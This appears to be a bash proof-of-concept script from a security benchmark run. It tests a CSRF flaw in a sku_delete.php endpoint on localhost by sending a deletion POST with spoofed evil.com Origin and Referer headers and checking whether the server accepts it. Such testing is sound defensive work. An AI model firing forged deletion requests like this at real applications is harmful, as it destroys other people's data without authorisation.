#!/bin/bash
# POC: CSRF attack on SKU deletion endpoint - demonstrates lack of CSRF token validation
# Target: ./repo
# Created: 2025-12-01T15:51:43.633Z
# Session: benchmark-XBEN-092-24-minbdcli

# CSRF POC for SKU Deletion Vulnerability (Version 2)
# This script demonstrates that the sku_delete.php endpoint lacks CSRF protection
# Simplified version focusing on the core CSRF attack

echo "=========================================="
echo "CSRF Vulnerability Test - SKU Deletion"
echo "=========================================="
echo ""

TARGET_URL="http://localhost:8081/sku_delete.php"
TEST_SKU_ID="10"

echo "[*] Testing CSRF attack on SKU deletion endpoint"
echo "[*] Target: $TARGET_URL"
echo "[*] Test SKU ID: $TEST_SKU_ID"
echo ""

# Perform CSRF deletion request from cross-origin
echo "[*] Performing CSRF POST request with cross-origin headers..."
echo "    Origin: http://evil.com"
echo "    Referer: http://evil.com"
echo ""

RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
    -H "Origin: http://evil.com" \
    -H "Referer: http://evil.com" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "id=$TEST_SKU_ID")

HTTP_CODE=$(echo "$RESPONSE" | tail -1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "[*] HTTP Response Code: $HTTP_CODE"
echo "[*] Response Body: $BODY"
echo ""

# Check if request was accepted (200 or 302 redirect would indicate processing)
if [[ "$HTTP_CODE" =~ ^(200|302)$ ]]; then
    echo "[+] CSRF REQUEST ACCEPTED - Server did not reject cross-origin request"
    echo "[+] No CSRF token validation detected"
    echo "[+] VULNERABILITY CONFIRMED: Application is vulnerable to CSRF attacks"
    echo ""
    echo "[*] Verification: Cross-origin DELETE requests are processed by the server"
    echo "[*] This means an attacker can craft a malicious page that deletes SKU records"
    echo "[*] when visited by an authenticated user of the target application."
    exit 0
else
    echo "[-] Request was rejected with status: $HTTP_CODE"
    exit 1
fi